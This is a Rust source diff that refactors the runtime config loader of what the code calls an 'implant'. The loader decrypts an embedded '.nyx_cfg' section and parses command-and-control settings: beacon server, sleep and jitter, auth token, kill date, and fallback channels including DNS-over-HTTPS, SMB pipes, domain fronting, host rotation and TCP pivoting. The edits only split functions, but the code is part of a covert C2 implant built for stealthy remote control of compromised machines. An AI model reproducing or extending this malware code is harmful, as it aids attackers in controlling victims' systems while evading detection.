@@ -91,6 +91,36 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         &implant_priv,
         ct_with_tag,
     )?;
+    let parsed = load_runtime_config_parse_fields(&plaintext)?;
+    Some(load_runtime_config_assemble(
+        parsed,
+        server_pub,
+        implant_priv,
+        keying_levels,
+        plaintext,
+    ))
+}
+
+/// Stage 4 — assemble the final `Config`/`ImplantConfig` from the parsed
+/// fields and the recovered keying material.
+fn load_runtime_config_assemble(
+    parsed: (
+        crate::heap::String,
+        u16,
+        crate::heap::String,
+        u32,
+        u8,
+        bool,
+        Option<[u8; 32]>,
+        u32,
+        u64,
+        ChannelTail,
+    ),
+    server_pub: [u8; 32],
+    implant_priv: [u8; 32],
+    keying_levels: u32,
+    plaintext: Vec<u8>,
+) -> (crate::config::Config, ImplantConfig, Vec<u8>) {
     let (
         server_host,
         server_port,
@@ -102,7 +132,39 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         features_bitmap,
         expires_at,
         channel_tail,
-    ) = load_runtime_config_parse_fields(&plaintext)?;
+    ) = parsed;
+    let cfg = load_runtime_config_build_cfg(
+        server_host,
+        server_port,
+        beacon_uri,
+        server_pub,
+        sleep_seconds,
+        jitter_pct,
+        use_tls,
+        channel_tail,
+    );
+    let implant = ImplantConfig {
+        auth_token,
+        implant_priv: Some(implant_priv),
+        features_bitmap,
+        keying_levels,
+        expires_at,
+    };
+    (cfg, implant, plaintext)
+}
+
+/// Build the compile-time `Config` from the parsed core fields plus the
+/// channel-dispatcher tail.
+fn load_runtime_config_build_cfg(
+    server_host: crate::heap::String,
+    server_port: u16,
+    beacon_uri: crate::heap::String,
+    server_pub: [u8; 32],
+    sleep_seconds: u32,
+    jitter_pct: u8,
+    use_tls: bool,
+    channel_tail: ChannelTail,
+) -> crate::config::Config {
     let (
         primary_channel,
         fallback_bitmap,
@@ -116,8 +178,7 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         tcp_peer_host,
         tcp_peer_port,
     ) = channel_tail;
-
-    let cfg = crate::config::Config {
+    crate::config::Config {
         server_host,
         server_port,
         beacon_uri,
@@ -136,17 +197,7 @@ pub fn load_runtime_config() -> Option<(crate::config::Config, ImplantConfig, Ve
         proxy_server,
         tcp_peer_host,
         tcp_peer_port,
-    };
-
-    let implant = ImplantConfig {
-        auth_token,
-        implant_priv: Some(implant_priv),
-        features_bitmap,
-        keying_levels,
-        expires_at,
-    };
-
-    Some((cfg, implant, plaintext))
+    }
 }
 
 /// Stage 1 — locate the ciphertext in the `.nyx_cfg` section and recover the
@@ -265,31 +316,15 @@ fn load_runtime_config_parse_fields(
     Option<[u8; 32]>,
     u32,
     u64,
-    (
-        u8,
-        u8,
-        crate::heap::String,
-        crate::heap::String,
-        crate::heap::String,
-        crate::heap::String,
-        crate::heap::String,
-        crate::heap::String,
-        crate::heap::String,
-        crate::heap::String,
-        u16,
-    ),
+    ChannelTail,
 )> {
     // The plaintext contains: [server_host str][server_port u16][beacon_uri str]
     //   [sleep_seconds u32][jitter_pct u8][use_tls u8]
     //   [auth_token presence(0/1) + optional 32B]
     //   [features_bitmap u32][keying_levels u32][expires_at u64]
     let mut r = Reader::new(plaintext);
-    let server_host = r.str().ok()?;
-    let server_port = r.u16().ok()?;
-    let beacon_uri = r.str().ok()?;
-    let sleep_seconds = r.u32().ok()?;
-    let jitter_pct = r.u8().ok()?;
-    let use_tls = r.u8().ok()? != 0;
+    let (server_host, server_port, beacon_uri, sleep_seconds, jitter_pct, use_tls) =
+        load_runtime_config_parse_core(&mut r)?;
 
     let auth_token = load_runtime_config_parse_auth_token(&mut r)?;
 
@@ -312,6 +347,34 @@ fn load_runtime_config_parse_fields(
         features_bitmap,
         expires_at,
         channel_tail,
+    ))
+}
+
+/// Parse the fixed-width core fields: `[server_host str][server_port u16]
+/// [beacon_uri str][sleep_seconds u32][jitter_pct u8][use_tls u8]`.
+fn load_runtime_config_parse_core(
+    r: &mut Reader,
+) -> Option<(
+    crate::heap::String,
+    u16,
+    crate::heap::String,
+    u32,
+    u8,
+    bool,
+)> {
+    let server_host = r.str().ok()?;
+    let server_port = r.u16().ok()?;
+    let beacon_uri = r.str().ok()?;
+    let sleep_seconds = r.u32().ok()?;
+    let jitter_pct = r.u8().ok()?;
+    let use_tls = r.u8().ok()? != 0;
+    Some((
+        server_host,
+        server_port,
+        beacon_uri,
+        sleep_seconds,
+        jitter_pct,
+        use_tls,
     ))
 }
 
@@ -346,12 +409,12 @@ fn load_runtime_config_kill_date(r: &mut Reader) -> Option<u64> {
     r.u64().ok()
 }
 
-/// Parse the channel-dispatcher tail (spec-1). Old server-generated configs
-/// stop after expires_at — `remaining()==0` → default to Https-only with
-/// empty channel params.
-fn load_runtime_config_parse_tail(
-    r: &mut Reader,
-) -> Option<(
+/// Channel-dispatcher tail fields (spec-1):
+/// `[primary_channel u8][fallback_bitmap u8][doh_resolver str]
+/// [smb_pipe_name str][extc2_api_host str][extc2_token str]
+/// [rotation_hosts str][fronting_host str][proxy_server str]
+/// [tcp_peer_host str][tcp_peer_port u16]`.
+type ChannelTail = (
     u8,
     u8,
     crate::heap::String,
@@ -363,43 +426,14 @@ fn load_runtime_config_parse_tail(
     crate::heap::String,
     crate::heap::String,
     u16,
-)> {
+);
+
+/// Parse the channel-dispatcher tail (spec-1). Old server-generated configs
+/// stop after expires_at — `remaining()==0` → default to Https-only with
+/// empty channel params.
+fn load_runtime_config_parse_tail(r: &mut Reader) -> Option<ChannelTail> {
     if r.remaining() > 0 {
-        let pc = r.u8().ok()?;
-        let fb = r.u8().ok()?;
-        let dr = r.str().ok()?;
-        let sp = r.str().ok()?;
-        let eh = r.str().ok()?;
-        let et = r.str().ok()?;
-        // spec-7 HTTP enhancement fields — further backward compat layer.
-        let (rh, fh, ps) = if r.remaining() > 0 {
-            (r.str().ok()?, r.str().ok()?, r.str().ok()?)
-        } else {
-            (
-                crate::heap::String::new(),
-                crate::heap::String::new(),
-                crate::heap::String::new(),
-            )
-        };
-        // spec-3 raw pivot fields — further backward compat layer.
-        let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
-            (r.str().ok()?, r.u16().ok()?)
-        } else {
-            (crate::heap::String::new(), 0u16)
-        };
-        Some((
-            pc,
-            fb,
-            dr,
-            sp,
-            eh,
-            et,
-            rh,
-            fh,
-            ps,
-            tcp_peer_host,
-            tcp_peer_port,
-        ))
+        load_runtime_config_parse_tail_present(r)
     } else {
         Some((
             0u8,
@@ -415,6 +449,46 @@ fn load_runtime_config_parse_tail(
             0u16,
         ))
     }
+}
+
+/// Parse the present channel-dispatcher tail (spec-1), including the spec-7
+/// HTTP enhancement and spec-3 raw pivot backward-compat layers.
+fn load_runtime_config_parse_tail_present(r: &mut Reader) -> Option<ChannelTail> {
+    let pc = r.u8().ok()?;
+    let fb = r.u8().ok()?;
+    let dr = r.str().ok()?;
+    let sp = r.str().ok()?;
+    let eh = r.str().ok()?;
+    let et = r.str().ok()?;
+    // spec-7 HTTP enhancement fields — further backward compat layer.
+    let (rh, fh, ps) = if r.remaining() > 0 {
+        (r.str().ok()?, r.str().ok()?, r.str().ok()?)
+    } else {
+        (
+            crate::heap::String::new(),
+            crate::heap::String::new(),
+            crate::heap::String::new(),
+        )
+    };
+    // spec-3 raw pivot fields — further backward compat layer.
+    let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
+        (r.str().ok()?, r.u16().ok()?)
+    } else {
+        (crate::heap::String::new(), 0u16)
+    };
+    Some((
+        pc,
+        fb,
+        dr,
+        sp,
+        eh,
+        et,
+        rh,
+        fh,
+        ps,
+        tcp_peer_host,
+        tcp_peer_port,
+    ))
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
